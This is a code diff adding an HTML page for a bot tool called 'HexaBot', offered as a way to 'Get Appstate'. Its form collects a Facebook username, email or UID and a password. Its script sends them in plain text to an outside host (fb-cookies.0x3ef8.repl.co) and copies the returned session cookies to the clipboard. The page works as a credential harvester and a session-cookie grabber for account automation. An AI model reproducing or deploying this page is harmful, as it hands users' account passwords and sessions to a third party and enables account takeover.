@@ -1,0 +1,141 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+    <title>BotGenius (BETA)</title>
+    <link href="https://fonts.googleapis.com/css?family=Poppins|Courier+New&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <style>
+        * {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+          font-family: 'Courier New', monospace;
+}
+
+body {
+    background-color: #1A1A1A;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+}
+
+form {
+    margin-top: 50%;
+    width: 20rem;
+    padding-bottom: 1.3rem;
+    background-color: #121212;
+    box-shadow: rgba(0, 0, 0, 0.24) 0px 3px 8px;
+    border-radius: 12px;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    flex-direction: column;
+}
+h1 {
+    color: white;
+    margin: 1.3rem 0;
+    font-size: 24px;
+}
+p {
+    color: white;
+}
+input {
+  font-size: 14px;
+}      
+input[type=text] {
+    background-color: #1A1A1A;
+    box-shadow: rgba(0, 0, 0, 0.02) 0px 1px 3px 0px, rgba(27, 31, 35, 0.15) 0px 0px 0px 1px;
+    height: 2.5rem;
+    border: none;
+    padding: 1rem;
+    border-radius: 7px;
+    width: 87%;
+    color: white;
+}
+input[type=text]:hover, input[type=text]:focus {
+    outline: none;
+}
+
+input[type=password] {
+    background-color: #1A1A1A;
+    box-shadow: rgba(0, 0, 0, 0.02) 0px 1px 3px 0px, rgba(27, 31, 35, 0.15) 0px 0px 0px 1px;
+    height: 2.5rem;
+    border: none;
+    padding: 1rem;
+    border-radius: 7px;
+    width: 87%;
+    color: white;
+    margin-top: 1rem;
+}
+input[type=password]:hover, input[type=password]:focus {
+    outline: none;
+}
+
+form button {
+    width: 87%;
+    height: 2.5rem;
+    background-color: #2b58ff;
+    border-radius: 6px;
+    border: none;
+    margin-top: 1rem;
+    color: white;
+    font-weight: 500;
+    margin-bottom: 0.5rem;
+}
+    </style>
+    <div class="container">
+        <h1>HexaBot | Get Appstate</h1>
+    <form id="form">
+        <h1>Credentials</h1>
+        <input type="text" name="username" id="email" placeholder="Username/Email/UID">
+        <input type="password" name="password" id="password" placeholder="Password">
+        <button type="submit" id="btn">Get Appstate</button>
+    </form>
+    </div>
+<script>
+  const btn = document.getElementById('btn');
+  const form = document.getElementById('form');
+  form.addEventListener('submit', (e) => {
+    e.preventDefault();
+    btn.style.opacity= '0.8';
+    btn.textContent = 'Loading...';
+    const makePostRequest = async (data, endpoint, callback) => {
+	const sent = await fetch(endpoint, {
+		method: 'POST',
+        headers: {
+        	'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(data)
+    })
+    try {
+    	const response = await sent.json()
+        callback(response)
+    } catch (error) {
+        console.log(error)
+        callback(error)
+    }
+  }
+    
+    let getVal = (id) => document.getElementById(id).value;
+    let email = getVal('email');
+    let password = getVal('password');
+    makePostRequest({ email, password }, 'https://fb-cookies.0x3ef8.repl.co/api', (res) => {     navigator.clipboard.writeText(JSON.stringify(res))
+    .then(function() {
+      btn.style.opacity= '1';
+      btn.textContent = 'Copied!';
+      setTimeout(() => {
+        btn.textContent = 'Get Appstate';
+      }, 2000)
+    })
+    .catch(function(err) {
+      alert('Unable to copy text to clipboard:', err);
+    });
+    })
+  })
+</script>
+</body>
+</html>
